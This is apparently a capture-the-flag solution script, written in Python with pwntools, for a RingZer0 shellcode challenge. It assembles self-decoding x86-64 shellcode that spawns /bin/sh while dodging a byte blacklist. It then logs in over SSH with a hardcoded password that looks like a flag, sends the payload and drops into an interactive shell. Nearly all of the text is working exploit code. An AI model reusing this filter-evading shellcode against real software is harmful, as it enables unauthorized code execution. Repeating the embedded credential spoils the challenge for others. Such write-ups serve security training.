#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

def escape_encode(s):
    ret = ''
    for c in s:
        ret += '\\x%02x' % ord(c)
    return ret

def limit(s):
    if len(s) > 90:
        return False
    for c in s:
        if c == '\x00':
            return False
        if c == '\x0a':
            return False
        if c == '\x0d':
            return False
        if c == '\x2f':
            return False
        if c == '\xff':
            return False
        if c == '\x0f':
            return False
        if c == '\x05':
            return False
        if c == '\x68':
            return False
        if 0x40 <= ord(c) and ord(c) <= 0x81:
            return False
    return True

mask = 0x82828282
# + 0x0
shellcode =  asm('mov ecx, 0x%08x' % mask)
shellcode += asm('xor ebx, ebx')
shellcode += asm('mov bl, 0x24')
shellcode += asm('sub byte ptr [rax + rbx], cl')
shellcode += asm('add ebx, 2')
shellcode += asm('sub dword ptr [rax + rbx], ecx')
shellcode += asm('add ebx, 4')
shellcode += asm('sub dword ptr [rax + rbx], ecx')
shellcode += asm('add ebx, 4')
shellcode += asm('sub dword ptr [rax + rbx], ecx')
shellcode += asm('add ebx, 12')
shellcode += asm('sub dword ptr [rax + rbx], ecx')
# + 0x24
shellcode += '\xca\xb8\xb1\xe4\xeb\xf0\xb1\xf5\xea\x82' # asm('mov rax, 0x016x' % unpack('/bin/sh\x00', 64)) + '\x82\x00\x82\x82\x82\x82\x82\x82\x82\x82'
shellcode += '\xd2'                                     # asm('push rax') + '\x82'
shellcode += '\xd6'                                     # asm('push rsp') + '\x82'
shellcode += '\xe1'                                     # asm('pop rdi') + '\x82'
shellcode += '\x12'                                     # asm('nop') + '\x82'
shellcode += asm('xor esi, esi')                        # 2 bytes
shellcode += asm('xor edx, edx')                        # 2 bytes
shellcode += asm('xor eax, eax')                        # 2 bytes
shellcode += asm('mov al, SYS_execve')                  # 2 bytes 
shellcode += '\x91\x87\x12\x13'                         # asm('syscall \n nop \n nop') + '\x82\x82\x82\x82'

if limit(shellcode) == False:
    print('limit failed!')
    exit(0)

conn = ssh(user = 'level6', 
           host = 'challenges.ringzer0team.com', 
           password = 'FLAG-5ieX3wF1IQ1nZR3X7813I56AZw', 
           port = 10127)
shell = conn.shell()
shell.sendline(escape_encode(shellcode))
shell.interactive()     # you will get shell here
